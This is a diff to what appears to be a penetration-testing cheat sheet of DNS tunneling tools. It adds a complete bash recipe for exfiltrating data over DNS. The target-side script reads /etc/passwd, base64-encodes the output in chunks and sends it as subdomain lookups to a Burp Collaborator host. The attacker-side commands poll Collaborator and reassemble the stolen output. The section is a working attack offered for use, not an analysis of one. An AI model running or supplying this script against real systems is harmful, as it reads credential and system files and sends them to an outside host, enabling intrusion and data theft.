@@ -601,6 +601,32 @@ https://github.com/sensepost/reGeorg
 https://github.com/fbkcs/ThunderDNS
 <br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.
 
+<br># Pure bash exfiltration over dns
+<br>## Execute on target server (replace YOURBCID)
+```
+CMD="cat /etc/passwd"
+HID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
+CMDID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
+BC="YOURBCID.burpcollaborator.net"
+D="$HID-$CMDID.$BC"
+M=$($CMD 2>&1); T=${#M}; O=0; S=30; I=1; while [ "${T}" -gt "0" ]; do C=$(echo ${M:${O}:${S}}|base64); C=${C//+/_0}; C=${C//\//_1}; C=${C//=/_2}; host -t A $I.${C}.$D&>/dev/null; O=$((${O}+${S})); T=$((${T}-${S})); I=$((I+1)); done
+```
+
+<br>## Execute on attacker machine (replace YOURBIID) and extract Burp Collaborator results
+```
+BCPURL="https://polling.burpcollaborator.net/burpresults?biid=YOURBIID"
+RESULTS=$(curl -sk "${BCPURL}")
+```
+<br>## Get IDs available
+```
+echo "${RESULTS}" | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'"protocol":"dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep --color=never "^[[:digit:]]+\..*\..*\.$BC$"; fi; done | sed -r 's/^[[:digit:]]+\.[^.]+\.([^.]+)\..*/\1/g' | sort -u
+```
+<br>## Update ID and get command result (repeat for each ID)
+```
+ID="xxxxx-xxxxx"
+echo "${RESULTS}" | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'"protocol":"dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep "^[[:digit:]]+\..*\..*\.$BC$"; fi; done | egrep "$ID" | sort -t. -k3 -g | sed -r 's/^[[:digit:]]+\.([^.]+)\..*/\1/g' | while read i; do i=${i//_0/+}; i=${i//_1/\/}; i=${i//_2/=}; echo ${i} | base64 -d; done
+```
+
 ## Manual
 
 ### Payloads
